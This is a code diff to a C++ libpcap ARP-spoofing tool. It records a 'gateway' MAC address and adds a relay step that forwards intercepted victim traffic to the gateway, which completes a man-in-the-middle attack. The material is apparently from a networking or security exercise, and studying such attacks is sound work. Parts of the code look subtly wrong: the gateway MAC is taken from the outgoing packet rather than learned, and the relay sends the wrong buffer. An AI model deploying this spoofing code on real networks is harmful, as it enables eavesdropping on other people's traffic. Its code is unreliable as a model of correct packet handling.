@@ -89,7 +89,10 @@ int main(int argc, char* argv[]) {
     pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
 
     Mac MAC_ADD;
+    Mac MAC_GATEWAY;
     Ip IP_ADD;
+
+    //MAC_ADD , IP_ADD is my mac & ip + gateway MAC_ADD..?
     GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);
 
     //To get vicitm MAC address - arp request to victim
@@ -134,6 +137,7 @@ int main(int argc, char* argv[]) {
             EthArpPacket *arp_packet = (EthArpPacket *)out_packet;
             if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == s_ip){
                 printf("Victim Mac Address Captured success\n");
+                MAC_GATEWAY = packet.arp_.tmac_;
                 packet.arp_.tmac_ = arp_packet->arp_.smac();
                 packet.eth_.dmac_ = arp_packet->arp_.smac();
                 break;
@@ -212,6 +216,18 @@ int main(int argc, char* argv[]) {
                else{
                    printf("0x%02x:", eth_hdr->ether_shost[i]);
                }
+           }
+
+           //make relay packetS
+           packet.arp_.tmac_ = Mac(MAC_GATEWAY);
+           packet.eth_.dmac_ = Mac(MAC_GATEWAY);
+
+           //relay to gateway
+           res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&out_packet), sizeof(EthArpPacket));
+           printf("%u bytes relayed to gateway\n", header->caplen);
+
+           if (res != 0) {
+               fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
     }
 
